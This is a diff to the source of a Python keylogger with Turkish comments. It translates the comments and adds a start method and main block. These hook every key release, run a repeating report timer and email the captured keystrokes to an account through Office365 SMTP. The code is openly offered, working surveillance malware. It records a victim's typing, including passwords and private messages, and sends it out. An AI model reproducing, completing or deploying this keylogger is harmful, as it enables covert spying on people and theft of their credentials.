@@ -19,6 +19,7 @@ self.log =""
 self.start_dt = datetime.now()
 self.end_dt = datetime.now()
 def callback(self, event):
+  
     """
     Bu callback, herhangi bir klavye olayi meydana geldiginde cagirilir
     (bu ornekte bir tus serbest birakildiginda)
@@ -73,16 +74,16 @@ def callback(self, event):
         return msg.as_string()
     
     def sendmail(self, email, password, message, verbose=1):
-        # manages a connection to an SMTP server
-        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        # bir SMTP sunucusunda baglantiyi yonetir
+        # Bizim durumumuzda Microsoft365, Outlook, Hotmail ve live.com içindir
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
+        # SMTP sunucusuna TLS modu olarak bağlanın (güvenlik için)
         server.starttls()
-        # login to the email account
+        # e-posta hesabına giris
         server.login(email, password)
-        # send the actual message after preparation
+        # hazırlıktan sonra asil mesaji gönderir
         server.sendmail(email, email, self.prepare_mail(message))
-        # terminates the session
+        # oturumu sonlandirir
         server.quit()
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
@@ -108,6 +109,22 @@ def callback(self, event):
         # is parcacigini daemon olarak ayarlayin
         timer.daemon = True
         # zamanlayiciyi baslatin
-        timer.start()        
+        timer.start()
+    def start(self):
+        # baslangic zamanini kaydedin
+        self.start_dt = datetime.now()
+        # keylogger baslat
+        keyboard.on_release(callback=self.callback)
+        # tus vuruslari kaydedilmeye baslar
+        self.report()
+        # basit bir mesaj olustur
+        print(f"{datetime.now()} - Started keylogger")
+        # gecerli is parcasini engeller. ctrl+c basana kadar bekler
+        keyboard.wait()
+if __name__ == "__main__":
+    # eger vuruslari dosya olarak kaydetmek istersen asagiya "file"
+    # eger vuruslar sana mail yoluyla gelsin istersen "email" olarak degistir
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger.start()
 
     
